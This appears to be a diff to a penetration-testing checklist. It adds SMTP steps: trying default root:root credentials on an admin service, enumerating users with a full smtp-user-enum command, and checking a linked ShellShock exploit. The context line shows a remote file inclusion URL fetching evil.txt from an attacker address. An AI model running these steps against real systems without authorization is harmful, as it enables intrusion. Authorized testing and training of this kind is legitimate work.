@@ -153,6 +153,14 @@ http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
 ## SMTP
 
 - [ ] If JAMPS Admin Control is present try root:root and listusers a setpassword 
+- [ ] Check the availables method and enumerate the users using smtp-user-enum
+- [ ] Check if vuln to ShellShock Exploit: postfix + procmail + formail ShellShock Exploit https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
+
+### Enum users
+
+```
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t IP
+```
 
 ## POP3
 
